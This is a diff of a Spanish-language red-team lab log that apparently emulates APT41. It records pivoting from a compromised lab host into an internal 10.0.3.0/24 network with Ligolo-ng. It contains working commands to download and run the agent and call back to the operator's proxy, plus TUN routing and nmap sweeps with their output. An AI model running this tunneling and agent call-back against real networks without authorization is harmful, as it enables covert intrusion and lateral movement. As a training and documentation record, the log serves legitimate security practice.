@@ -1,202 +1,138 @@
 # Pivoting Log — Operación SILENT BRIDGE
 ## Fase 3 — Protocol Tunneling con Ligolo-ng
 **Operación:** SILENT BRIDGE | **Adversario:** APT41 | **Framework:** MITRE ATT&CK v14  
-**Operador:** Adrián Camacho | **Fecha:** —  
-**Objetivo:** Establecer túnel TLS desde PROD hacia Kali y enrutar red interna
+**Operador:** Adrián Camacho | **Fecha:** 14/05/2026  
+**Objetivo:** Túnel TLS hacia red interna `10.0.3.0/24` a través de PROD
 
 ---
 
-## FASE 3 — Pivoting: Ligolo-ng
+## FASE 3 — Pivoting: Ligolo-ng v0.7.5
 
-**Táctica MITRE:** TA0011 — Command and Control  
-**Técnicas:**
-- T1572 — Protocol Tunneling
-- T1090 — Proxy
-
-**Herramienta:** Ligolo-ng (proxy + agent)
+**Tácticas MITRE:** TA0011 — C2 / TA0008 — Lateral Movement  
+**Técnicas:** T1572 — Protocol Tunneling | T1090 — Proxy
 
 ### Contexto táctico
 
-Tras comprometer PROD en Fase 2, se confirma que este host tiene visibilidad hacia una red interna no accesible desde Kali. Ligolo-ng se despliega para establecer un túnel TLS persistente que permite operar contra los hosts internos directamente desde Kali, sin necesidad de proxychains ni herramientas intermedias.
-
-A diferencia de Chisel (userspace SOCKS proxy), Ligolo-ng crea una interfaz de red virtual (tuntap) en Kali, haciendo el tráfico hacia la red interna totalmente transparente para cualquier herramienta (Nmap, Evil-WinRM, Sliver, etc.).
+Tras comprometer PROD se confirma visibilidad hacia `10.0.3.0/24` (interfaz `enp0s8`). Ligolo-ng establece un túnel TLS entre el agent en PROD y el proxy en Kali, creando una interfaz `tun` que enruta el tráfico de forma transparente — cualquier herramienta (Nmap, Evil-WinRM, Sliver) opera contra la red interna sin proxychains.
 
 ---
 
-## 3.1 — Preparación del proxy en Kali
-**Técnica MITRE:** T1572 — Protocol Tunneling  
-**Captura:** `fase3-01-ligolo-proxy-listening.png`
+### 3.1 — Proxy en Kali
+**Captura:** ![fase3-01](../screenshots/FASE-3-Pivot-Ligolo-ng/fase3-01-ligolo-proxy-listening.png)
 
 ```bash
-# Crear interfaz TUN (solo necesario una vez por sesión de sistema)
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
-
-# Verificar interfaz creada
-ip link show ligolo
+/opt/ligolo/proxy -selfcert -laddr 0.0.0.0:11601
 ```
 
-**Output esperado:**
 ```
-X: ligolo: <NO-CARRIER,POINTOPOINT,MULTICAST,NOARP,UP> mtu 1500 qdisc pfifo_fast state DOWN ...
+WARN[0000] Using self-signed certificates
+WARN[0000] TLS Certificate fingerprint: 4BD05BE7...
+INFO[0000] Listening on 0.0.0.0:11601
+ligolo-ng »
 ```
-
-```bash
-# Arrancar el proxy Ligolo-ng
-./proxy -selfcert -laddr 0.0.0.0:11601
-```
-
-**Output esperado:**
-```
-INFO[...] Starting self-signed certificate generation...
-INFO[...] Proxy listening on 0.0.0.0:11601
-```
-
-| Parámetro | Valor | Descripción |
-|-----------|-------|-------------|
-| `-selfcert` | — | Genera certificado TLS autofirmado (no requiere CA) |
-| `-laddr` | `0.0.0.0:11601` | Escucha en todas las interfaces, puerto 11601 |
 
 ---
 
-## 3.2 — Transferencia y ejecución del agent en PROD
+### 3.2 — Agent en PROD
 **Técnica MITRE:** T1105 — Ingress Tool Transfer  
-**Captura:** `fase3-02-ligolo-agent-connected.png`
+**Captura:** ![fase3-02](../screenshots/FASE-3-Pivot-Ligolo-ng/fase3-02-ligolo-agent-connected.png)
 
 ```bash
-# ─── KALI — Servir el agent ───
-cd /path/to/ligolo-ng/
-python3 -m http.server 8888
-```
+# Kali → transferir agent
+scp /opt/ligolo/agent thomas@10.0.2.200:/tmp/
 
-```bash
-# ─── PROD (desde la shell obtenida en Fase 2) ───
-wget http://10.0.2.9:8888/agent -O /tmp/agent
+# PROD → ejecutar agent
 chmod +x /tmp/agent
-
-# Lanzar agent en background
 /tmp/agent -connect 10.0.2.9:11601 -ignore-cert &
 ```
 
-**Output en KALI (consola Ligolo-ng):**
+**Output en consola Ligolo-ng:**
 ```
-INFO[...] Agent connected from <PROD_IP>:<PORT>
+INFO[0297] Agent joined.  id=badd2b6e  name=thomas@prod  remote=10.0.2.200:52232
 ```
-
-| Parámetro | Valor | Descripción |
-|-----------|-------|-------------|
-| `-connect` | `10.0.2.9:11601` | IP y puerto del proxy (Kali) |
-| `-ignore-cert` | — | Aceptar certificado autofirmado del proxy |
 
 ---
 
-## 3.3 — Activar el túnel
-**Técnica MITRE:** T1090 — Proxy  
-**Captura:** `fase3-03-ligolo-tunnel-active.png`
+### 3.3 — Activar túnel e ifconfig
+**Captura:** ![fase3-03](../screenshots/FASE-3-Pivot-Ligolo-ng/fase3-03-ligolo-tunnel-active.png)
 
 ```
-# ─── Consola interactiva Ligolo-ng (Kali) ───
 ligolo-ng » session
-
-# Output:
-# [Agent : root@prod-machine] ...
-# [0] Agent: root@prod ...
-
-ligolo-ng » [0]   # seleccionar la sesión
-
-ligolo-ng » ifconfig
+? Specify a session: 1 - thomas@prod - 10.0.2.200:52232
+[Agent: thomas@prod] » ifconfig
 ```
 
-**Output de `ifconfig` — interfaces visibles desde PROD:**
-```
-┌─────────────────────────────────────────────┐
-│ Interface 0                                 │
-│ Name: eth0                                  │
-│ Hardware MAC: ...                           │
-│ MTU: 1500                                   │
-│ IPv4 address: 10.0.2.200/24                 │  ← Red externa (conocida)
-├─────────────────────────────────────────────┤
-│ Interface 1                                 │
-│ Name: eth1                                  │
-│ Hardware MAC: ...                           │
-│ MTU: 1500                                   │
-│ IPv4 address: 10.X.X.X/24                  │  ← RED INTERNA ← anotar este rango
-└─────────────────────────────────────────────┘
-```
+**Interfaces visibles desde PROD:**
 
-> **Acción:** Anotar el rango de la red interna descubierto. Actualizar el diagrama de topología.
+| Interfaz | IP | Red |
+|---------|-----|-----|
+| `enp0s3` | `10.0.2.200/24` | LabRedTeam (externa) |
+| `enp0s8` | `10.0.3.200/24` | **LabInternal ← objetivo** |
 
 ```
-ligolo-ng » start
-# INFO[...] Starting tunnel to agent root@prod-machine
+[Agent: thomas@prod] » start
 ```
 
 ---
 
-## 3.4 — Enrutar red interna en Kali
-**Captura:** `fase3-04-route-added-kali.png`
+### 3.4 — Ruta en Kali
+**Captura:** ![fase3-04](../screenshots/FASE-3-Pivot-Ligolo-ng/fase3-04-route-added-kali.png)
 
 ```bash
-# ─── KALI (nueva terminal) ───
-# Añadir ruta hacia la red interna a través de la interfaz ligolo
-sudo ip route add 10.X.X.0/24 dev ligolo   # sustituir por el rango real
-
-# Verificar ruta añadida
+sudo ip route add 10.0.3.0/24 dev ligolo
 ip route | grep ligolo
 ```
 
-**Output esperado:**
 ```
-10.X.X.0/24 dev ligolo scope link
+10.0.3.0/24 dev ligolo scope link
 ```
 
 ---
 
-## 3.5 — Verificación de conectividad a través del túnel
-**Técnica MITRE:** T1046 — Network Service Discovery  
-**Captura:** `fase3-05-nmap-through-tunnel.png`
+### 3.5 — Verificación de conectividad
+**Captura:** ![fase3-05](../screenshots/FASE-3-Pivot-Ligolo-ng/fase3-05-nmap-through-tunnel.png)
 
 ```bash
-# ─── KALI — Ping sweep de la red interna (directamente, sin proxychains) ───
-nmap -sn 10.X.X.0/24 --min-rate 5000
-
-# Escaneo de puertos en hosts identificados
-nmap -sC -sV -p- 10.X.X.X --min-rate 5000 -oA nmap/internal_sweep
+nmap -sn --unprivileged 10.0.3.0/24
 ```
 
-**Output esperado:**
 ```
-Host: 10.X.X.X (git-server)    Status: Up
-Host: 10.X.X.X (pc-windows)   Status: Up
+Host is up: 10.0.3.5, 10.0.3.7, 10.0.3.150, 10.0.3.200
 ```
 
-**Criterio de éxito Fase 3:** ✅ Hosts internos alcanzables directamente desde Kali a través del túnel Ligolo-ng. Sin proxychains — tráfico enrutado nativamente.
+Hosts internos alcanzables directamente desde Kali. Sin proxychains. ✅
+
+**Nota técnica:** ICMP no funciona a través del túnel Ligolo-ng (no soportado). Usar Nmap con `--unprivileged` o TCP connect scan para host discovery.
 
 ---
 
-## Resumen Fase 3
+### Resumen Fase 3
 
 ```
 PIVOTING — Estado final
 ════════════════════════════════════════════════════
 
-TUNNEL Ligolo-ng
-  Proxy (Kali)   → 0.0.0.0:11601 ✅
-  Agent (PROD)   → conectado ✅
-  Túnel TLS      → activo ✅
-  Interfaz       → ligolo (tun) ✅
+TUNNEL Ligolo-ng v0.7.5
+  Proxy (Kali)      → 0.0.0.0:11601 ✅
+  Agent (PROD)      → badd2b6e thomas@prod ✅
+  Túnel TLS         → activo ✅
+  Interfaz tun      → ligolo (Kali) ✅
 
 ROUTING
-  Red interna    → 10.X.X.0/24 dev ligolo ✅
-  Hosts internos → alcanzables desde Kali ✅
+  10.0.3.0/24 dev ligolo ✅
+  Hosts internos alcanzables directamente ✅
 
-TÉCNICAS MITRE EJECUTADAS:
+TÉCNICAS MITRE:
   T1105  → Ingress Tool Transfer (agent a PROD)
   T1572  → Protocol Tunneling (Ligolo-ng TLS)
-  T1090  → Proxy (routing a través de PROD)
+  T1090  → Proxy (routing transparente)
   T1046  → Network Service Discovery (verificación)
 ```
 
+**Criterio de éxito Fase 3:** ✅
+
 ---
 
-**Siguiente fase:** [post-exploitation.md](post-exploitation.md) — Fase 4: Enumeración red interna + Fase 5: Lateral Movement al PC Windows
+**Siguiente fase:** [enumeration_log.md](enumeration_log.md) — Fase 4 (enumeración interna)
